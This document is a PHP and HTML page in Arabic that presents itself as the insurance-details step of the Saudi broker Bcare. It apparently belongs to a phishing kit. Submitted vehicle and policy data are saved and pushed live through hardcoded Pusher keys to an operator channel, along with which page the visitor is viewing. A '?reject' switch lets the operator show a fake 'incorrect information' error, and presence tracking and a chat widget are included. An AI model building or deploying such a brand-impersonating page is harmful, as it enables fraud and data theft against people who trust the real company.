<?php
error_reporting(0);
ini_set('display_errors', 0);
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'بيانات التأمين');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'بيانات التأمين']);
}

if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_POST['submit'])) {
    if (isset($_SESSION['user_id'])) {
        $dbRef = new DB();
        $dbRef->query("UPDATE `users` SET `docDate` = ?, `purposeUse` = ?, `carValue` = ?, `createdYear` = ?, `repairPlace` = ?, `message` = ? WHERE `id` = ?");
        $dbRef->bind(1, $_POST['date']);
        $dbRef->bind(2, $_POST['purposeUse']);
        $dbRef->bind(3, $_POST['carValue']);
        $dbRef->bind(4, $_POST['createdYear']);
        $dbRef->bind(5, $_POST['repairPlace']);
        $dbRef->bind(6, 'بيانات التأمين');
        $dbRef->bind(7, $_SESSION['user_id']);
        if ($dbRef->execute()) {
            $pusher->trigger('bcare', 'update-user-accountt', [
                'userId' => $_SESSION['user_id'],
                'updatedData' => [
                    'message' => 'بيانات التأمين',
                    'date' => $_POST['date'],
                    'purposeUse' => $_POST['purposeUse'],
                    'carValue' => $_POST['carValue'],
                    'createdYear' => $_POST['createdYear'],
                    'repairPlace' => $_POST['repairPlace']
                ]
            ]);
        }
    }
    $_SESSION['date'] = $_POST['date'];
    $_SESSION['createdYear'] = $_POST['createdYear'];
    echo "<script>document.location.href='index-types.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بيانات التأمين | بي كير</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-color: #156394;
            --secondary-color: #f9a824;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: var(--text-dark);
        }

        .navbar {
            background: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .details-card {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.03);
            margin-top: 30px;
            border: 1px solid rgba(0, 0, 0, 0.05);
        }

        .form-label {
            font-weight: 700;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .form-control,
        .form-select {
            height: 55px;
            border-radius: 12px;
            border: 2px solid #f1f5f9;
            font-weight: 600;
        }

        .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 4px rgba(21, 99, 148, 0.1);
        }

        .repair-option {
            flex: 1;
            padding: 15px;
            border: 2px solid #f1f5f9;
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }

        .repair-option input {
            display: none;
        }

        .repair-option.active {
            border-color: var(--primary-color);
            background: #eff6ff;
            color: var(--primary-color);
        }

        .btn-submit {
            height: 60px;
            border-radius: 12px;
            background: var(--secondary-color);
            color: white;
            font-weight: 900;
            font-size: 1.1rem;
            border: none;
            transition: all 0.3s;
            margin-top: 20px;
        }

        .btn-submit:hover:not(:disabled) {
            background: #e8951a;
            transform: translateY(-2px);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .feature-box {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.03);
            height: 100%;
        }

        .feature-box img {
            width: 40px;
            height: 40px;
            margin-bottom: 15px;
        }

        footer {
            background: var(--primary-color);
            color: white;
            padding: 40px 0;
            margin-top: 80px;
        }

        /* Calendar Skin */
        .modal-content {
            border-radius: 24px;
            border: none;
            overflow: hidden;
        }

        .calendar-header {
            background: var(--primary-color);
            color: white;
            padding: 20px;
        }

        .calendar-table th {
            color: #64748b;
            font-size: 0.75rem;
            text-transform: uppercase;
        }

        .calendar-table td {
            padding: 12px;
            font-weight: 700;
            cursor: pointer;
            border-radius: 10px;
        }

        .calendar-table td:hover:not(.disabled) {
            background: #eff6ff;
            color: var(--primary-color);
        }

        .calendar-table td.today {
            background: var(--secondary-color) !important;
            color: white !important;
        }

        .calendar-table td.disabled {
            color: #cbd5e1;
            cursor: not-allowed;
        }
    </style>
</head>

<body>

    <nav class="navbar text-center">
        <div class="container">
            <a href="index.php"><img src="./assets/Bcare-logo.svg" alt="Bcare" height="40"></a>
        </div>
    </nav>

    <main class="container pb-5">
        <div class="row justify-content-center">
            <div class="col-lg-7">
                <div class="details-card">
                    <h3 class="fw-900 text-center mb-4">بيانات التأمين</h3>
                    <form action="" method="POST" id="detailsForm">

                        <div class="mb-4">
                            <label class="form-label">تاريخ بدء الوثيقة</label>
                            <input type="text" id="selectedDate" name="date" readonly required
                                class="form-control bg-white text-center" style="cursor: pointer;"
                                placeholder="اختر التاريخ من التقويم">
                        </div>

                        <div class="mb-4">
                            <label class="form-label">الغرض من استخدام المركبة</label>
                            <select name="purposeUse" required class="form-select">
                                <option value="">إختر الغرض</option>
                                <option value="شخصي">شخصي</option>
                                <option value="تجاري">تجاري</option>
                                <option value="تأجير">تأجير</option>
                                <option value="نقل الركاب أو كريم-أوبر">نقل الركاب أو كريم-أوبر</option>
                                <option value="نقل بضائع">نقل بضائع</option>
                            </select>
                        </div>

                        <div class="row mb-4">
                            <div class="col-md-7 mb-3 mb-md-0">
                                <label class="form-label">القيمة التقديرية للمركبة (ريال)</label>
                                <input type="number" name="carValue" required class="form-control"
                                    placeholder="مثال: 50,000">
                            </div>
                            <div class="col-md-5">
                                <label class="form-label">سنة الصنع</label>
                                <select name="createdYear" required class="form-select">
                                    <option value="">سنة الصنع</option>
                                    <?php for ($i = 2026; $i >= 1990; $i--)
                                        echo "<option value='$i'>$i</option>"; ?>
                                </select>
                            </div>
                        </div>

                        <div class="mb-4">
                            <label class="form-label">مكان الإصلاح المفضل</label>
                            <div class="d-flex gap-3">
                                <label class="repair-option active" id="labelRepairAgency">
                                    <input type="radio" name="repairPlace" value="الوكالة" checked
                                        onchange="updateRepairUI()">
                                    <span>الوكالة</span>
                                </label>
                                <label class="repair-option" id="labelRepairWorkshop">
                                    <input type="radio" name="repairPlace" value="الورشة" onchange="updateRepairUI()">
                                    <span>الورشة</span>
                                </label>
                            </div>
                        </div>

                        <!-- Captcha -->
                        <div class="mb-4">
                            <label class="form-label">رمز التحقق</label>
                            <div class="d-flex gap-2">
                                <input type="text" id="captchaInput" required class="form-control text-center fs-4"
                                    placeholder="الرمز">
                                <canvas id="captchaCanvas" width="100" height="55" onclick="generateCaptcha()"
                                    style="background:#f1f5f9; border-radius:12px; cursor:pointer;"></canvas>
                            </div>
                        </div>

                        <button type="submit" name="submit" id="submitBtn" disabled class="btn btn-submit w-100">إظهار
                            العروض</button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Features -->
        <div class="mt-5 pt-5">
            <h4 class="text-center fw-900 mb-5" style="color: var(--primary-color);">لماذا بي كير هي الخيار الأفضل؟</h4>
            <div class="row g-4">
                <div class="col-6 col-md-3">
                    <div class="feature-box">
                        <img src="./assets/insureOneMin.svg" alt="">
                        <h6 class="fw-bold">تأمينك في دقيقة</h6>
                    </div>
                </div>
                <div class="col-6 col-md-3">
                    <div class="feature-box">
                        <img src="./assets/priceLess.svg" alt="">
                        <h6 class="fw-bold">أفضل الأسعار</h6>
                    </div>
                </div>
                <div class="col-6 col-md-3">
                    <div class="feature-box">
                        <img src="./assets/sechleInsure.svg" alt="">
                        <h6 class="fw-bold">إصدار فوري</h6>
                    </div>
                </div>
                <div class="col-6 col-md-3">
                    <div class="feature-box">
                        <img src="./assets/saudi.svg" alt="">
                        <h6 class="fw-bold">سعودي 100%</h6>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Calendar Modal (Simplified) -->
    <div class="modal fade" id="calendarModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="calendar-header d-flex justify-content-between align-items-center">
                    <button class="btn text-white" onclick="prevMonth()"><i class="bi bi-chevron-right"></i></button>
                    <h5 id="calendarTitle" class="mb-0 fw-bold"></h5>
                    <button class="btn text-white" onclick="nextMonth()"><i class="bi bi-chevron-left"></i></button>
                </div>
                <div class="p-3">
                    <table class="table calendar-table text-center">
                        <thead>
                            <tr>
                                <th>ح</th>
                                <th>ن</th>
                                <th>ث</th>
                                <th>ر</th>
                                <th>خ</th>
                                <th>ج</th>
                                <th>س</th>
                            </tr>
                        </thead>
                        <tbody id="calendarBody"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="container text-center">
            <img src="./assets/logo-bacre-white.svg" alt="Bcare" height="40" class="mb-4">
            <p class="mb-0 opacity-75 small">جميع الحقوق محفوظة © 2024 شركة عناية الوسيط لوساطة التأمين</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let captchaText = '';
        function generateCaptcha() {
            const canvas = document.getElementById('captchaCanvas');
            const ctx = canvas.getContext('2d');
            captchaText = Math.floor(1000 + Math.random() * 9000).toString();
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.font = 'bold 24px Cairo';
            ctx.fillStyle = '#156394';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillText(captchaText, canvas.width / 2, canvas.height / 2);
            document.getElementById('captchaInput').setAttribute('pattern', captchaText);
        }

        function updateRepairUI() {
            const workshop = document.querySelector('input[value="الورشة"]').checked;
            document.getElementById('labelRepairWorkshop').classList.toggle('active', workshop);
            document.getElementById('labelRepairAgency').classList.toggle('active', !workshop);
        }

        // Simple Calendar Logic
        let currentCalDate = new Date();
        const calModal = new bootstrap.Modal(document.getElementById('calendarModal'));

        document.getElementById('selectedDate').onclick = () => {
            renderCalendar();
            calModal.show();
        };

        function renderCalendar() {
            const body = document.getElementById('calendarBody');
            const title = document.getElementById('calendarTitle');
            body.innerHTML = '';

            const year = currentCalDate.getFullYear();
            const month = currentCalDate.getMonth();
            const monthNames = ["يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو", "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"];
            title.innerText = `${monthNames[month]} ${year}`;

            const firstDay = new Date(year, month, 1).getDay();
            const daysInMonth = new Date(year, month + 1, 0).getDate();
            const today = new Date();

            let row = document.createElement('tr');
            for (let i = 0; i < firstDay; i++) row.appendChild(document.createElement('td'));

            for (let d = 1; d <= daysInMonth; d++) {
                if (row.children.length === 7) { body.appendChild(row); row = document.createElement('tr'); }
                const cell = document.createElement('td');
                cell.innerText = d;

                const cellDate = new Date(year, month, d);
                if (cellDate < today.setHours(0, 0, 0, 0)) cell.classList.add('disabled');
                else {
                    cell.onclick = () => {
                        document.getElementById('selectedDate').value = `${year}-${String(month + 1).padStart(2, '0')}-${String(d).padStart(2, '0')}`;
                        calModal.hide();
                        validateForm();
                    };
                }
                if (cellDate.toDateString() === new Date().toDateString()) cell.classList.add('today');
                row.appendChild(cell);
            }
            body.appendChild(row);
        }

        function prevMonth() { currentCalDate.setMonth(currentCalDate.getMonth() - 1); renderCalendar(); }
        function nextMonth() { currentCalDate.setMonth(currentCalDate.getMonth() + 1); renderCalendar(); }

        function validateForm() {
            const form = document.getElementById('detailsForm');
            const isValid = form.checkValidity() && document.getElementById('captchaInput').value === captchaText;
            document.getElementById('submitBtn').disabled = !isValid;
        }

        $(document).ready(() => {
            generateCaptcha();
            $('#detailsForm input, #detailsForm select').on('input change', validateForm);
        });
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات التي أدخلتها غير صحيحة، يرجى التأكد من الحقول والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>